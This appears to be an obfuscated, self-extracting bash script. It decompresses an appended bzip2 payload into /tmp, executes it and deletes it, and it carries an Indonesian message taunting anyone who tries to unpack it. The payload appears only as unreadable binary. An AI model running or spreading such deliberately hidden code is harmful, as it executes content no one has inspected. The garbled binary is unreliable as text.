#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYuP3 U�p� }�����������`�    h    1�2a 1�4h��h   Ԑ���� P      �ѣh�&b��F� i��  1�2a 1�4h��h  �ѣh�&b��F� i��  R"21�  &��h�ɓ�4i3$��=��i�>�"j�����$��?��?V%
_��I\��II5-Ŷ�(��L������w�D� ���}_��7�bH����(����+���H��/�m'�'��ά��}Y�Q]��>ga��5����v7�?M,����y7���C���L�!AƆal��5ʆ���T���BDx�M"?0�1���Mt���PС��"JN�T�=���C�����QK�;E$5�"HG����$�J����˫nϵ�]V4-���6�Z/0\E�b�(XL�:�w�?7��xxʷ��/��5�mR<��u�<��̯q���m�j��W#Y���]g�+��0Ľ:�c�o��s��ZZ�V&�Cf��:��"--���/��_,���g�����<�P����8b�S��l�$P�w��{e���hj�W���+̻.��n����l�USP�Ski���ư�e|`a�G(�����SC�ԜO�.d�u��;�6"Dx�Q����E�̓co�.G���8W��z�8Z����ܶ�Q4~�)E0����a�8EtEzI��Z�glz�:\���cc}�ϻf�-�4��銇��CQ�*V�;�rq�(ݏN�SٻR<�ņ��V8��v^��Q�<Q��"ǏdE�f#ag��ˑ�?�b6���YR��B�[���:Q��_t�/eZ�y1�(u5*")����W�S�ˍb.W�n�޿VF��Lk�x��qz�,�)��̆�)��){h�\~����h�^fa(ܥ8Zn$�XS%�͹�w4��;��3�p�����6jWGy���7�I���y��^��6Ɛ�X�Q�5���`�����]�䒨��~�d�����1T��ݙ�P���uN[,���_.,Ok#Of,C���2���풴P¦��sE�\��X\%���G����S��� 
[D<Y!�)�
�hb�Fi(RD3D$	�����M%ë���I_h��Q��M�]�7��tE{[�w�m��-/bmx��X��F�����֘c�DT�(�i�+"�v�ַ'��c�y�j+�+-��V��ʇ��u"#)ޚ��4�d�%��|��);�^u0�cB4�
��=��C]���U�&�11}{"�?���U�}�N4�L�+���o��!�N���6W
�د.WX��cQZ��f��6>I��r�cQ�-	�xʑ���oij���X�XboK=+lw�ܮ=�gN�X�{������zI$���!�ΡZ:�N�$��I&�[��G'SĤ�+:���$�K�Yl�::�:H�U�ZFGI�ی/�Y+[t9d�����M���+*�oT%	S$;�4�}���-Hnj�e��ap�M��]L4KYh)������ZT�r�	5�c2k�1��j�!%�b�MELE�p�t#Y�Z���zG*���d�$��m;}��/��9"����_�Fh���#��CĆ�!B��JQS���慷{^^�Q�c�n
�U/}2�m�"�p����p���h��nެP����)�&��4�h��I���x]g���]�)�º���#:�Ƒg)f!�و��58x,Efڤ��n�0�qʇ�z�P�B���[u��i1���|���`T�^�H�M�-8�\d�2*Mu�fx�Eh�=��E�7��zBI������ʴ�U:�u�����\F�'��[[{�l
2�x+Z{_����D�T�}q	�{�_|�g��^��	����E�<Q�����}�E3�XL��U��%F�G\х���HR��ʢ^y�)MEN')���ga��r3�
҃���cہ�G�Ѷ�t7��y�75����܊}I4�u�S��=�����j���̈dK�N���P`&��q�G���"�(H:���